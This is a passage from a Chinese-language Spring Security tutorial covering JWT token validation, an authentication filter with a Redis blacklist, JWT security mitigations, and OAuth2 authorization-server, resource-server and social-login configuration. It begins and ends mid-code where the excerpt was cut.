    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        return claimsResolver.apply(parseToken(token));
    }

    /** 提取用户名（subject）*/
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    /** 提取过期时间 */
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }

    /** 提取用户ID */
    public Long extractUserId(String token) {
        Object uid = extractClaim(token, claims -> claims.get(CLAIM_USER_ID));
        return uid != null ? Long.valueOf(uid.toString()) : null;
    }

    /** 提取角色列表 */
    @SuppressWarnings("unchecked")
    public List<String> extractRoles(String token) {
        return (List<String>) extractClaim(token, claims -> claims.get(CLAIM_ROLES));
    }

    /** 提取 Token 类型（access/refresh）*/
    public String extractTokenType(String token) {
        return (String) extractClaim(token, claims -> claims.get(CLAIM_TYPE));
    }

    // ─────────────────────────── 验证 Token ──────────────────────────────

    /**
     * 全面验证 Token（签名 + 有效期 + 用户信息）
     */
    public boolean isTokenValid(String token, UserDetails userDetails) {
        try {
            String username = extractUsername(token);
            return username.equals(userDetails.getUsername()) && !isTokenExpired(token);
        } catch (JwtException | IllegalArgumentException e) {
            log.debug("Token 验证失败: {}", e.getMessage());
            return false;
        }
    }

    /**
     * 仅验证 Token 格式和签名（不验证用户）
     * 抛出具体异常，便于返回不同的错误信息
     */
    public void validateToken(String token) {
        try {
            Jwts.parser().verifyWith(getSigningKey()).build().parseSignedClaims(token);
        } catch (ExpiredJwtException e) {
            throw new JwtTokenException("Token 已过期，请重新登录");
        } catch (MalformedJwtException e) {
            throw new JwtTokenException("Token 格式错误");
        } catch (SignatureException e) {
            throw new JwtTokenException("Token 签名验证失败");
        } catch (UnsupportedJwtException e) {
            throw new JwtTokenException("不支持的 Token 类型");
        } catch (IllegalArgumentException e) {
            throw new JwtTokenException("Token 为空或无效");
        }
    }

    /** Token 是否已过期 */
    public boolean isTokenExpired(String token) {
        try {
            return extractExpiration(token).before(new Date());
        } catch (ExpiredJwtException e) {
            return true;
        }
    }

    /** 获取 Token 剩余有效时间（毫秒），已过期返回 -1 */
    public long getRemainingValidityMs(String token) {
        try {
            Date expiration = extractExpiration(token);
            long remaining = expiration.getTime() - System.currentTimeMillis();
            return Math.max(remaining, -1);
        } catch (ExpiredJwtException e) {
            return -1;
        }
    }

    // ─────────────────────────── 辅助方法 ────────────────────────────────

    /**
     * 从请求头中提取 Token（去掉 "Bearer " 前缀）
     */
    public String extractTokenFromHeader(String authorizationHeader) {
        if (authorizationHeader != null && authorizationHeader.startsWith(TOKEN_PREFIX)) {
            return authorizationHeader.substring(TOKEN_PREFIX.length()).trim();
        }
        return null;
    }
}

// 自定义异常
public class JwtTokenException extends RuntimeException {
    public JwtTokenException(String message) {
        super(message);
    }
}
```

---

## 4.6 JWT 认证过滤器（完整实现）

```java
package com.example.security.filter;

import com.example.security.util.JwtTokenUtil;
import io.jsonwebtoken.JwtException;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.util.AntPathMatcher;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;

/**
 * JWT 认证过滤器
 * 继承 OncePerRequestFilter 确保每个请求只执行一次
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenUtil jwtTokenUtil;
    private final UserDetailsService userDetailsService;
    private final StringRedisTemplate redisTemplate;

    // Token 黑名单 Redis 前缀
    private static final String BLACKLIST_PREFIX = "jwt:blacklist:";

    // 不需要 JWT 验证的路径白名单
    private static final List<String> WHITE_LIST = Arrays.asList(
        "/api/auth/login",
        "/api/auth/register",
        "/api/auth/refresh",
        "/api/auth/forgot-password",
        "/api/public/**",
        "/swagger-ui/**",
        "/v3/api-docs/**",
        "/actuator/health"
    );

    private final AntPathMatcher pathMatcher = new AntPathMatcher();

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain) throws ServletException, IOException {
        String requestPath = request.getServletPath();

        // 1. 提取 Authorization 请求头
        String authHeader = request.getHeader(JwtTokenUtil.HEADER);
        String token = jwtTokenUtil.extractTokenFromHeader(authHeader);

        // 2. 没有 Token，直接放行（由后续的 AuthorizationFilter 决定是否拒绝）
        if (token == null) {
            filterChain.doFilter(request, response);
            return;
        }

        try {
            // 3. 验证 Token 格式和签名（会抛出具体异常）
            jwtTokenUtil.validateToken(token);

            // 4. 检查 Token 是否已被注销（黑名单）
            if (isTokenBlacklisted(token)) {
                log.debug("Token 已注销，拒绝访问: {}", requestPath);
                sendUnauthorizedResponse(response, "Token 已注销，请重新登录");
                return;
            }

            // 5. 检查 Token 类型（必须是 access token）
            String tokenType = jwtTokenUtil.extractTokenType(token);
            if (!JwtTokenUtil.TYPE_ACCESS.equals(tokenType)) {
                sendUnauthorizedResponse(response, "请使用 Access Token");
                return;
            }

            // 6. 当前 SecurityContext 中没有认证信息时才处理
            if (SecurityContextHolder.getContext().getAuthentication() == null) {
                String username = jwtTokenUtil.extractUsername(token);

                // 7. 加载用户详情（建议加 Redis 缓存减少 DB 查询）
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);

                // 8. 再次验证 Token 与用户的对应关系
                if (jwtTokenUtil.isTokenValid(token, userDetails)) {

                    // 9. 构建认证对象并存入 SecurityContext
                    UsernamePasswordAuthenticationToken authToken =
                        new UsernamePasswordAuthenticationToken(
                            userDetails,
                            null,                       // 认证后不需要密码
                            userDetails.getAuthorities()
                        );
                    // 设置请求详情（IP 地址等）
                    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    SecurityContextHolder.getContext().setAuthentication(authToken);

                    log.debug("JWT 认证成功 - 用户: {}, 路径: {}", username, requestPath);
                }
            }

        } catch (JwtTokenException e) {
            // Token 验证失败（格式错误、签名无效、已过期等）
            log.warn("JWT 验证失败: {} - 路径: {}", e.getMessage(), requestPath);
            sendUnauthorizedResponse(response, e.getMessage());
            return;
        } catch (Exception e) {
            log.error("JWT 过滤器异常: {}", e.getMessage(), e);
            sendUnauthorizedResponse(response, "认证处理异常");
            return;
        }

        filterChain.doFilter(request, response);
    }

    /**
     * 检查 Token 是否在黑名单中
     */
    private boolean isTokenBlacklisted(String token) {
        return Boolean.TRUE.equals(redisTemplate.hasKey(BLACKLIST_PREFIX + token));
    }

    /**
     * 返回 401 未授权响应（JSON格式）
     */
    private void sendUnauthorizedResponse(HttpServletResponse response, String message)
            throws IOException {
        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        response.getWriter().write(
            String.format("{\"code\":401,\"message\":\"%s\",\"data\":null}", message));
    }

    /**
     * 白名单路径跳过此过滤器（可选优化）
     */
    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String path = request.getServletPath();
        return WHITE_LIST.stream().anyMatch(pattern -> pathMatcher.match(pattern, path));
    }
}
```

---

## 4.7 完整 JWT 安全配置

```java
package com.example.security.config;

import com.example.security.filter.JwtAuthenticationFilter;
import com.example.security.handler.CustomAccessDeniedHandler;
import com.example.security.handler.CustomAuthenticationEntryPoint;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final CustomUserDetailsService userDetailsService;
    private final JwtAuthenticationFilter jwtAuthenticationFilter;
    private final CustomAuthenticationEntryPoint authEntryPoint;
    private final CustomAccessDeniedHandler accessDeniedHandler;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // ① 禁用 CSRF（JWT 无状态，不需要 CSRF 防护）
            .csrf(AbstractHttpConfigurer::disable)

            // ② 禁用 Session（无状态模式）
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )

            // ③ 禁用默认的表单登录和 HTTP Basic（使用自定义接口登录）
            .formLogin(AbstractHttpConfigurer::disable)
            .httpBasic(AbstractHttpConfigurer::disable)

            // ④ 配置异常处理器
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(authEntryPoint)    // 未认证：返回 401
                .accessDeniedHandler(accessDeniedHandler)    // 无权限：返回 403
            )

            // ⑤ 配置 URL 访问权限
            .authorizeHttpRequests(auth -> auth
                // 放行：认证相关
                .requestMatchers("/api/auth/**").permitAll()
                // 放行：公开接口
                .requestMatchers("/api/public/**").permitAll()
                // 放行：API 文档（生产环境应关闭）
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()
                // 放行：健康检查
                .requestMatchers("/actuator/health").permitAll()
                // 其余请求需要认证
                .anyRequest().authenticated()
            )

            // ⑥ 配置认证 Provider
            .authenticationProvider(daoAuthenticationProvider())

            // ⑦ 在 UsernamePasswordAuthenticationFilter 之前插入 JWT 过滤器
            .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public DaoAuthenticationProvider daoAuthenticationProvider() {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService);
        provider.setPasswordEncoder(passwordEncoder());
        return provider;
    }

    /**
     * 暴露 AuthenticationManager Bean（供 AuthService 调用）
     */
    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration configuration) throws Exception {
        return configuration.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}

// 未认证处理器（401）
@Component
public class CustomAuthenticationEntryPoint implements AuthenticationEntryPoint {
    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response,
                         AuthenticationException authException) throws IOException {
        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(401);
        response.getWriter().write("{\"code\":401,\"message\":\"未登录，请先登录\",\"data\":null}");
    }
}

// 权限不足处理器（403）
@Component
public class CustomAccessDeniedHandler implements AccessDeniedHandler {
    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException {
        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(403);
        response.getWriter().write("{\"code\":403,\"message\":\"权限不足，禁止访问\",\"data\":null}");
    }
}
```

---

## 4.8 刷新 Token 机制

```
Token 刷新流程：

+--------+                    +----------+             +-------+
| 客户端  |                    |  服务端   |             | Redis |
+--------+                    +----------+             +-------+
    |                               |                      |
    |---- POST /api/auth/login ---->|                      |
    |                               | 认证成功              |
    |                               |-- STORE refresh ---->|
    |<---- {                        |  key: refresh:{user} |
    |   accessToken: xxxxx          |  value: refresh_token|
    |   refreshToken: yyyyy         |  ttl: 7 days         |
    |   expiresIn: 1800             |                      |
    | }                             |                      |
    |                               |                      |
    | （30分钟后 accessToken 过期）   |                      |
    |                               |                      |
    |---- GET /api/data ----------->|                      |
    |  Authorization: Bearer xxxxx  |                      |
    |                               | Token 已过期！        |
    |<---- 401 Token已过期 ----------|                      |
    |                               |                      |
    |---- POST /api/auth/refresh -->|                      |
    |  Refresh-Token: yyyyy         |                      |
    |                               |-- GET refresh:user ->|
    |                               |<--- yyyyy ------------|
    |                               | 比对 OK               |
    |                               | 生成新 accessToken    |
    |<---- {                        |                      |
    |   accessToken: zzzzz          |                      |
    |   expiresIn: 1800             |                      |
    | }                             |                      |
    |                               |                      |
    |---- GET /api/data ----------->|                      |
    |  Authorization: Bearer zzzzz  |                      |
    |<---- 200 正常数据 ------------|                      |
```

---

## 4.9 JWT 安全注意事项

```
JWT 安全威胁清单与应对措施：

╔════════════════════════╦═══════════════════════════════════════╗
║ 威胁                    ║ 防护措施                               ║
╠════════════════════════╬═══════════════════════════════════════╣
║ Token 传输被窃听         ║ ✓ 强制使用 HTTPS                      ║
║                        ║ ✓ 生产环境开启 HSTS                    ║
╠════════════════════════╬═══════════════════════════════════════╣
║ XSS 攻击窃取 Token      ║ ✓ 存入 httpOnly Cookie（JS无法访问）   ║
║                        ║ ✓ 实施严格 CSP 策略                    ║
║                        ║ ✓ 对用户输入严格编码过滤                ║
╠════════════════════════╬═══════════════════════════════════════╣
║ Token 被盗后无法失效     ║ ✓ Access Token 短有效期（15-30分钟）   ║
║                        ║ ✓ Redis 黑名单（登出时加入黑名单）       ║
║                        ║ ✓ 版本号机制（改密后旧Token失效）        ║
╠════════════════════════╬═══════════════════════════════════════╣
║ Token 伪造/篡改          ║ ✓ 使用强密钥（≥256位随机字符串）       ║
║                        ║ ✓ 服务端强制指定签名算法                ║
║                        ║ ✓ 验证 iss/aud 等标准 Claims           ║
╠════════════════════════╬═══════════════════════════════════════╣
║ 重放攻击                 ║ ✓ 使用 jti（唯一ID）                  ║
║                        ║ ✓ 短有效期                             ║
║                        ║ ✓ HTTPS 防止截获                       ║
╠════════════════════════╬═══════════════════════════════════════╣
║ 算法混淆攻击             ║ ✓ 服务端使用 parserBuilder().requireAlgorithm()   ║
║                        ║ ✓ 禁止接受 alg:none 的 Token           ║
╠════════════════════════╬═══════════════════════════════════════╣
║ Payload 泄露敏感信息     ║ ✓ Payload 只存非敏感信息              ║
║                        ║ ✓ 需要加密时使用 JWE（加密 JWT）        ║
╚════════════════════════╩═══════════════════════════════════════╝

Token 存储位置对比：

localStorage：
  ✗ 可被 XSS 脚本读取（危险）
  ✓ 简单易用
  ✗ 不推荐存储 Token

sessionStorage：
  ✗ 同样可被 XSS 读取
  ✓ 关闭标签自动清除

httpOnly Cookie：
  ✓ JavaScript 无法读取（防 XSS）
  ✓ 可配合 SameSite 防 CSRF
  ✓ 推荐方案
  注意：需配合 CSRF Token 或 SameSite=Strict

内存（JS 变量）：
  ✓ 安全（XSS 无法持久化）
  ✗ 刷新页面丢失（需配合 refresh token）
  ✓ SPA 应用适用
```
---

# Part 5: OAuth2.0 集成

## 5.1 OAuth2.0 四种授权模式

### 授权码模式（最常用，最安全）

```
授权码模式完整时序图（以 GitHub 登录为例）：

用户浏览器          我的应用           GitHub 授权服务器      GitHub API
    |                  |                      |                   |
    |                  |                      |                   |
    | 点击"GitHub登录"  |                      |                   |
    |-- GET /oauth/github -->                  |                   |
    |                  |                      |                   |
    |                  | 构建授权 URL：         |                   |
    |                  | https://github.com/login/oauth/authorize  |
    |                  | ?client_id=abc                           |
    |                  | &redirect_uri=http://myapp/callback       |
    |                  | &scope=user:email read:user               |
    |                  | &state=CSRF_TOKEN_xyz  ← 防CSRF攻击       |
    |                  | &response_type=code                      |
    |<-- 302 重定向 ----|                      |                   |
    |                  |                      |                   |
    |-- 访问 GitHub 授权页 ------------------>|                   |
    |                                         |                   |
    |<-------- 展示授权同意页 ----------------|                   |
    |  "MyApp 请求以下权限：                   |                   |
    |   □ 读取您的个人信息                     |                   |
    |   □ 读取您的邮箱地址                     |                   |
    |   [授权] [取消]"                         |                   |
    |                                         |                   |
    | 用户点击[授权]                            |                   |
    |-- 点击授权 ----------------------------->|                   |
    |                                         |                   |
    |<-- 302 重定向到                          |                   |
    |  http://myapp/callback                  |                   |
    |  ?code=AUTHORIZATION_CODE               |                   |
    |  &state=CSRF_TOKEN_xyz  ← 验证state     |                   |
    |                                         |                   |
    |-- 携带 code 请求我的应用 -->             |                   |
    |                  |                      |                   |
    |                  | 验证 state           |                   |
    |                  | 用 code 换 token     |                   |
    |                  |-- POST /login/oauth/access_token ------->|
    |                  |   client_id=abc                          |
    |                  |   client_secret=xyz                      |
    |                  |   code=AUTHORIZATION_CODE                |
    |                  |   redirect_uri=...                       |
    |                  |                      |                   |
    |                  |<-- {                 |                   |
    |                  |   access_token: ghp_xxx                  |
    |                  |   token_type: bearer                     |
    |                  |   scope: user:email,read:user            |
    |                  | }                    |                   |
    |                  |                      |                   |
    |                  | 用 access_token 获取用户信息              |
    |                  |-- GET /user --------------------------->|
    |                  |   Authorization: token ghp_xxx          |
    |                  |                                         |
    |                  |<-- {"login":"tom","email":"...","id":123}|
    |                  |                                         |
    |                  | 查找或创建本地用户                        |
    |                  | 生成本应用的 JWT Token                    |
    |<-- 登录成功，返回JWT Token                |                  |
```

### 客户端凭证模式（微服务间调用）

```
客户端凭证模式（Machine to Machine）：

微服务A                        授权服务器
    |                              |
    |-- POST /oauth2/token ------->|
    |   Content-Type: application/x-www-form-urlencoded
    |   Authorization: Basic base64(clientId:clientSecret)
    |   grant_type=client_credentials
    |   scope=internal:read                               
    |                              |
    |                              | 验证 client credentials
    |                              | 生成 access_token（无用户身份）
    |                              |
    |<-- 200 {                     |
    |   "access_token": "xxxxx",   |
    |   "token_type": "Bearer",    |
    |   "expires_in": 3600,        |
    |   "scope": "internal:read"   |
    | }                            |
    |                              |
    | 调用微服务B                    |
    |-- GET /api/products -------> 微服务B
    |   Authorization: Bearer xxxxx
    |                              |
    |<-- 200 [商品列表] ------------|
```

---

## 5.2 Spring Authorization Server 完整搭建

```xml
<!-- 授权服务器 pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-authorization-server</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

```java
package com.example.authserver.config;

import com.nimbusds.jose.jwk.*;
import com.nimbusds.jose.jwk.source.*;
import com.nimbusds.jose.proc.SecurityContext;
import org.springframework.context.annotation.*;
import org.springframework.core.annotation.Order;
import org.springframework.http.MediaType;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.oauth2.core.*;
import org.springframework.security.oauth2.core.oidc.OidcScopes;
import org.springframework.security.oauth2.server.authorization.client.*;
import org.springframework.security.oauth2.server.authorization.config.annotation.web.configuration.*;
import org.springframework.security.oauth2.server.authorization.config.annotation.web.configurers.*;
import org.springframework.security.oauth2.server.authorization.settings.*;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint;
import org.springframework.security.web.util.matcher.MediaTypeRequestMatcher;

import java.security.*;
import java.security.interfaces.*;
import java.time.Duration;
import java.util.UUID;

@Configuration
public class AuthorizationServerConfig {

    /**
     * 授权服务器的 SecurityFilterChain（最高优先级）
     */
    @Bean
    @Order(1)
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {
        // 应用 Spring Authorization Server 默认安全配置
        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);

        http.getConfigurer(OAuth2AuthorizationServerConfigurer.class)
            // 启用 OpenID Connect 1.0（支持 /userinfo 端点）
            .oidc(oidc -> oidc
                .userInfoEndpoint(userInfo -> userInfo
                    // 自定义 UserInfo 响应（添加额外字段）
                    .userInfoMapper(userInfoContext -> {
                        OidcUserInfo.Builder builder = OidcUserInfo.builder()
                            .subject(userInfoContext.getAuthorization().getPrincipalName());
                        // 添加自定义字段
                        return builder.build();
                    })
                )
            );

        // 未认证时重定向到登录页
        http.exceptionHandling(exceptions -> exceptions
            .defaultAuthenticationEntryPointFor(
                new LoginUrlAuthenticationEntryPoint("/login"),
                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
            )
        );

        return http.build();
    }

    /**
     * 默认安全过滤链（处理登录等）
     */
    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());
        return http.build();
    }

    /**
     * 客户端注册仓库（生产环境应存数据库）
     */
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        // ① Web 应用客户端（授权码模式）
        RegisteredClient webClient = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("web-client")
            // 生产环境用 {bcrypt} 前缀
            .clientSecret("{noop}web-secret")
            .clientName("My Web Application")
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
            // 允许的回调地址
            .redirectUri("http://localhost:3000/login/oauth2/code/myapp")
            .redirectUri("http://localhost:3000/callback")
            // 登出后回调
            .postLogoutRedirectUri("http://localhost:3000/logout-success")
            // 授权范围
            .scope(OidcScopes.OPENID)
            .scope(OidcScopes.PROFILE)
            .scope(OidcScopes.EMAIL)
            .scope("user:read")
            .scope("user:write")
            // 客户端设置
            .clientSettings(ClientSettings.builder()
                .requireAuthorizationConsent(true)   // 需要显示同意页
                .requireProofKey(true)               // 启用 PKCE（推荐）
                .build()
            )
            // Token 设置
            .tokenSettings(TokenSettings.builder()
                .accessTokenFormat(OAuth2TokenFormat.SELF_CONTAINED)  // JWT 格式
                .accessTokenTimeToLive(Duration.ofMinutes(30))
                .refreshTokenTimeToLive(Duration.ofDays(7))
                .reuseRefreshTokens(false)           // 每次刷新生成新的 refresh token
                .authorizationCodeTimeToLive(Duration.ofMinutes(5))
                .build()
            )
            .build();

        // ② 服务间客户端（客户端凭证模式）
        RegisteredClient serviceClient = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("order-service")
            .clientSecret("{noop}order-secret")
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.CLIENT_CREDENTIALS)
            .scope("product:read")
            .scope("inventory:write")
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofHours(1))
                .build()
            )
            .build();

        return new InMemoryRegisteredClientRepository(webClient, serviceClient);
    }

    /**
     * JWK 密钥源（RSA 非对称加密，推荐用于 Token 签名）
     */
    @Bean
    public JWKSource<SecurityContext> jwkSource() {
        RSAKey rsaKey = generateRsaKey();
        JWKSet jwkSet = new JWKSet(rsaKey);
        return new ImmutableJWKSet<>(jwkSet);
    }

    private static RSAKey generateRsaKey() {
        try {
            KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
            generator.initialize(2048);
            KeyPair keyPair = generator.generateKeyPair();
            return new RSAKey.Builder((RSAPublicKey) keyPair.getPublic())
                .privateKey((RSAPrivateKey) keyPair.getPrivate())
                .keyID(UUID.randomUUID().toString())
                .build();
        } catch (GeneralSecurityException ex) {
            throw new RuntimeException("生成 RSA 密钥失败", ex);
        }
    }

    /**
     * 授权服务器元数据配置
     */
    @Bean
    public AuthorizationServerSettings authorizationServerSettings() {
        return AuthorizationServerSettings.builder()
            .issuer("http://localhost:9000")
            .build();
    }
}
```

---

## 5.3 OAuth2 Resource Server（资源服务器）

```java
// 资源服务器配置（验证 JWT Token）
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class ResourceServerConfig {

    @Bean
    public SecurityFilterChain resourceServerFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            )
            // 配置为 OAuth2 资源服务器
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .decoder(jwtDecoder())
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
                // JWT 验证失败时的处理
                .authenticationEntryPoint((req, res, ex) -> {
                    res.setContentType("application/json;charset=UTF-8");
                    res.setStatus(401);
                    res.getWriter().write("{\"code\":401,\"message\":\"Token无效或已过期\"}");
                })
            );
        return http.build();
    }

    /**
     * JWT 解码器（验证签名）
     * 从授权服务器的 jwks_uri 获取公钥
     */
    @Bean
    public JwtDecoder jwtDecoder() {
        // 方式1：从授权服务器 JWK 端点获取公钥（推荐）
        return NimbusJwtDecoder
            .withJwkSetUri("http://localhost:9000/oauth2/jwks")
            .build();

        // 方式2：直接配置公钥文件（静态配置）
        // return NimbusJwtDecoder.withPublicKey(rsaPublicKey).build();
    }

    /**
     * JWT 权限转换器
     * 将 JWT 中的字段转换为 Spring Security 的 GrantedAuthority
     */
    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter converter = new JwtGrantedAuthoritiesConverter();
        // 从 JWT 的 "roles" 字段提取权限（默认是 "scope"）
        converter.setAuthoritiesClaimName("roles");
        // 添加 "ROLE_" 前缀（默认是 "SCOPE_"）
        converter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter jwtConverter = new JwtAuthenticationConverter();
        jwtConverter.setJwtGrantedAuthoritiesConverter(converter);
        // 从 JWT 的 "sub" 字段提取用户名
        jwtConverter.setPrincipalClaimName(JwtClaimNames.SUB);
        return jwtConverter;
    }
}
```

```yaml
# 资源服务器 application.yml（自动配置方式）
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # 从授权服务器自动发现 JWK 端点
          issuer-uri: http://localhost:9000
          # 或者直接指定 JWK 地址
          jwk-set-uri: http://localhost:9000/oauth2/jwks
```

---

## 5.4 OAuth2 Client（第三方登录）

```yaml
# application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          # GitHub 登录（Spring 内置支持，只需配置 ID 和 Secret）
          github:
            client-id: ${GITHUB_CLIENT_ID}
            client-secret: ${GITHUB_CLIENT_SECRET}
            scope: user:email, read:user

          # Google 登录
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: openid, profile, email

          # 微信登录（自定义提供商）
          wechat:
            provider: wechat
            client-id: ${WECHAT_APP_ID}
            client-secret: ${WECHAT_APP_SECRET}
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope: snsapi_userinfo
            client-name: 微信

        provider:
          # 微信 OAuth2 提供商配置（非 OIDC 标准）
          wechat:
            authorization-uri: https://open.weixin.qq.com/connect/qrconnect
            token-uri: https://api.weixin.qq.com/sns/oauth2/access_token
            user-info-uri: https://api.weixin.qq.com/sns/userinfo
            user-name-attribute: openid
```

```java
@Configuration
@EnableWebSecurity
public class OAuth2LoginConfig {

    @Autowired
    private OAuth2UserService<OAuth2UserRequest, OAuth2User> oAuth2UserService;

    @Bean
    public SecurityFilterChain oauth2FilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login/**", "/oauth2/**", "/error").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                // 自定义用户信息服务（处理不同平台的用户信息格式差异）
                .userInfoEndpoint(userInfo -> userInfo
                    .userService(oAuth2UserService)
                )
                // 登录成功处理
                .successHandler(new SimpleUrlAuthenticationSuccessHandler("/dashboard"))
                // 登录失败处理
                .failureUrl("/login?oauth2Error=true")
            )
            .logout(logout -> logout
                .logoutSuccessUrl("/")
                .deleteCookies("JSESSIONID")
            );

        return http.build();
    }
}

/**
 * OAuth2 用户服务
 * 处理第三方用户信息，绑定/创建本地账号
 */
@Service
@RequiredArgsConstructor
public class CustomOAuth2UserService implements OAuth2UserService<OAuth2UserRequest, OAuth2User> {

    private final SysUserRepository userRepository;
    private final SocialBindRepository socialBindRepository;

    @Override
    @Transactional
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        // 1. 调用父类加载 OAuth2User 信息
        DefaultOAuth2UserService delegate = new DefaultOAuth2UserService();
        OAuth2User oAuth2User = delegate.loadUser(userRequest);

        // 2. 获取提供商标识
        String registrationId = userRequest.getClientRegistration().getRegistrationId();

        // 3. 提取用户信息（不同平台字段不同）
        String oauthId, email, name, avatar;
        switch (registrationId) {
            case "github" -> {
                oauthId = oAuth2User.getAttribute("id").toString();
                email   = oAuth2User.getAttribute("email");
                name    = oAuth2User.getAttribute("login");
                avatar  = oAuth2User.getAttribute("avatar_url");
            }
            case "google" -> {
                oauthId = oAuth2User.getAttribute("sub");
                email   = oAuth2User.getAttribute("email");
                name    = oAuth2User.getAttribute("name");
                avatar  = oAuth2User.getAttribute("picture");
            }
            default -> {
                oauthId = oAuth2User.getName();
                email   = oAuth2User.getAttribute("email");
                name    = oAuth2User.getAttribute("name");
                avatar  = null;
            }
        }

        // 4. 查找社交账号绑定关系
        Optional<SocialBind> bindOpt = socialBindRepository
            .findByProviderAndOpenId(registrationId, oauthId);

        SysUser localUser;
        if (bindOpt.isPresent()) {
            // 已绑定，直接使用绑定的本地账号
            localUser = bindOpt.get().getUser();
